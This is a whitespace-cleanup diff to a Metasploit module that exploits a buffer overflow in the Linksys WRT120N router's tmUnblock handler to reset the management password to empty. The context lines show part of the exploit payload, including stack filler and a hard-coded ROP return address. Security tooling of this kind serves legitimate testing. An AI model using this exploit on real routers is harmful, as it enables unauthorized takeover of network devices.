@@ -13,12 +13,12 @@ class Metasploit3 < Msf::Auxiliary
     super(update_info(info,
       'Name'            => 'Linksys WRT120N Buffer Overflow in tmUnblock - Password Reset',
       'Description'     => %q{
-          This module exploits a buffer overflow vulnerability in the WRT120N Linksys router. 
-         It is possible to reset the password of the management interface temporarily to an 
+          This module exploits a buffer overflow vulnerability in the WRT120N Linksys router.
+         It is possible to reset the password of the management interface temporarily to an
          empty value. It was tested on a WRT120N firmware version 1.0.07.
       },
-      'Author'          => 
-        [ 
+      'Author'          =>
+        [
           'Craig Heffner',  #original exploit
           'Michael Messner <devnull[at]s3cur1ty.de>'  #metasploit module
         ],
@@ -48,7 +48,7 @@ class Metasploit3 < Msf::Auxiliary
     postdata << Rex::Text.rand_text_alpha(4)              # Stack filler
     postdata << "\x80\x34\x71\xB8"                        # ROP 1 $ra (address of ROP 2)
     postdata << Rex::Text.rand_text_alpha(8)              # Stack filler
- 
+
     (0..3).each do |i|
       postdata << Rex::Text.rand_text_alpha(4)            # ROP 2 $s0, don't care
       postdata << Rex::Text.rand_text_alpha(4)            # ROP 2 $s1, don't care
